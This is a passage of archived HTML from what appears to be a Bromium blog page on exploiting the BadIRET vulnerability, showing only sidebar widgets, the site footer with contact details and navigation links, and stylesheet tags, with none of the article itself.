</aside><aside id="text-10" class="widget group widget_text">			<div class="textwidget"><a href="https://web.archive.org/web/20171118232027/http://bit.ly/2lEoRZ5"><img src="./2015 - Exploiting BadIRET vulnerability_files/potential-Risk-assesment-ad-2.jpg" alt="It&#39;s secure but is it Bromium Secure?"></a></div>
		</aside><aside id="twitter_timeline-2" class="widget group widget_twitter_timeline"><h3 class="widget-title">Bromium Tweets</h3><a class="twitter-timeline" data-theme="light" data-link-color="#4298b5" data-border-color="#e8e8e8" data-tweet-limit="6" data-lang="EN" data-partner="jetpack" data-chrome="noborders" href="https://web.archive.org/web/20171118232027/https://twitter.com/bromium">My Tweets</a></aside></div>
		</div>
	</div><!-- .row -->

</div><!-- .col-xs-12 -->

		</div>
	</div>
</main>

<section class="we-section-footer we-section">
	<div class="we-footer-container">
		<div class="we-footer-left">
			<div class="we-inner-content">
				<div class="we-footer-logo">
					<a href="https://web.archive.org/web/20171118232027/https://www.bromium.com/"><img src="./2015 - Exploiting BadIRET vulnerability_files/bromium-footer-logo.png" alt="logo"></a>
				</div>
				<div class="we-footer-info">
					<p class="we-para-13">US: 1.408.213.5668</p>
					<p class="we-para-13">UK: +44.1223.314914</p>
					<p class="we-para-13"><a href="https://web.archive.org/web/20171118232027/mailto:info@bromium.com">info@bromium.com</a></p>
				</div>
				<div class="we-footer-social-icon">
					<ul>
						<li><a href="https://web.archive.org/web/20171118232027/https://twitter.com/bromium" target="_blank"><img src="./2015 - Exploiting BadIRET vulnerability_files/twitter_icon.png" alt="twitter"></a></li>
						<li><a href="https://web.archive.org/web/20171118232027/http://www.linkedin.com/company/bromium" target="_blank"><img src="./2015 - Exploiting BadIRET vulnerability_files/linkedin_icon.png" alt="linkedin"></a></li>
						<li><a href="https://web.archive.org/web/20171118232027/https://www.facebook.com/bromium" target="_blank"><img src="./2015 - Exploiting BadIRET vulnerability_files/facebook_icon.png" alt="facebook"></a></li>
						<li><a href="https://web.archive.org/web/20171118232027/mailto:info@bromium.com" target="_blank"><img src="./2015 - Exploiting BadIRET vulnerability_files/email_icon.png" alt="email"></a></li>
						<li><a href="https://web.archive.org/web/20171118232027/http://blogs.bromium.com/" target="_blank"><img src="./2015 - Exploiting BadIRET vulnerability_files/rss_icon.png" alt="rss"></a></li>
					</ul>
				</div>
			</div>
		</div>
		<div class="we-col-four-outer">
		<div class="we-col-four"> <span>COMPANY</span>
			<ul>
				<li><a href="https://web.archive.org/web/20171118232027/https://www.bromium.com/company.html">About Us</a></li>
				<li><a href="https://web.archive.org/web/20171118232027/https://www.bromium.com/company/news.html">News</a></li>
				<li><a href="https://web.archive.org/web/20171118232027/https://www.bromium.com/company/events.html">Events</a></li>
				<li><a href="https://web.archive.org/web/20171118232027/https://www.bromium.com/company/investors.html">Investors</a></li>
			</ul>
		</div>
		<div class="we-col-four"> <span>PLATFORM</span>
			<ul>
				<li><a href="https://web.archive.org/web/20171118232027/https://www.bromium.com/platform.html">Overview</a></li>
				<li><a href="https://web.archive.org/web/20171118232027/https://www.bromium.com/platform/our-technology.html">Technology</a></li>
				<li><a href="https://web.archive.org/web/20171118232027/https://www.bromium.com/resources/threat-information.html">Threats</a></li>
			</ul>
		</div>
		<div class="we-col-four"> <span>SOLUTIONS</span>
			<ul>
				<li><a href="https://web.archive.org/web/20171118232027/https://www.bromium.com/industries/government.html">Public Sector</a></li>
				<li><a href="https://web.archive.org/web/20171118232027/https://www.bromium.com/industries/financial-services.html">Finance</a></li>
				<li><a href="https://web.archive.org/web/20171118232027/https://www.bromium.com/industries/energy.html">Energy</a></li>
				<li><a href="https://web.archive.org/web/20171118232027/https://www.bromium.com/industries/healthcare.html">Healthcare</a></li>
				<li><a href="https://web.archive.org/web/20171118232027/https://www.bromium.com/industries/retail.html">Retail</a></li>
			</ul>
		</div>
		<div class="we-col-four"> <span>QUICKLINKS</span>
			<ul>
				<li><a href="https://web.archive.org/web/20171118232027/https://blogs.bromium.com/" target="_blank">Blog</a></li>
				<li><a href="https://web.archive.org/web/20171118232027/https://www.bromium.com/resources.html">Resources</a></li>
				<li><a href="https://web.archive.org/web/20171118232027/https://www.bromium.com/supportservices.html">Support</a></li>
				<li><a href="https://web.archive.org/web/20171118232027/https://www.bromium.com/company/careers.html">Careers</a></li>
			</ul>
		</div>
	</div>
	<div class="we-subscribe"><span>STAY CONNECTED</span>
		<p>Join our mailing list</p>
		<div class="we-subscribe-mail">
			<a href="https://web.archive.org/web/20171118232027/http://learn.bromium.com/opt-in-mailing-list" target="_blank"><input type="submit" class="we-subscribe-button" value="Subscribe"> </a>
		</div>
		<span class="we-text-bold">MANAGE SUBSCRIPTIONS</span></div>
	</div>
</section>

</div> <!-- #page -->

<div class="we-footer-bottom">
	<ul>
		<li><a href="https://web.archive.org/web/20171118232027/https://www.bromium.com/legal/privacy.html">Privacy</a></li>
		<li><a href="https://web.archive.org/web/20171118232027/https://www.bromium.com/legal.html">Legal</a></li>
		<li><a href="https://web.archive.org/web/20171118232027/https://www.bromium.com/legal/patents.html">Patents</a></li>
		<li><a href="https://web.archive.org/web/20171118232027/https://www.bromium.com/sitemap.html">Sitemap</a></li>
		<li><a href="https://web.archive.org/web/20171118232027/http://learn.bromium.com/request-demo.html" target="_blank">Contact</a></li>
	</ul>
</div>

<link rel="stylesheet" id="spcalendar-jos-css" href="./2015 - Exploiting BadIRET vulnerability_files/calendar-jos.css" type="text/css" media="">
<link rel="stylesheet" id="wp-color-picker-css" href="./2015 - Exploiting BadIRET vulnerability_files/color-picker.min.css" type="text/css" media="all"></body></html>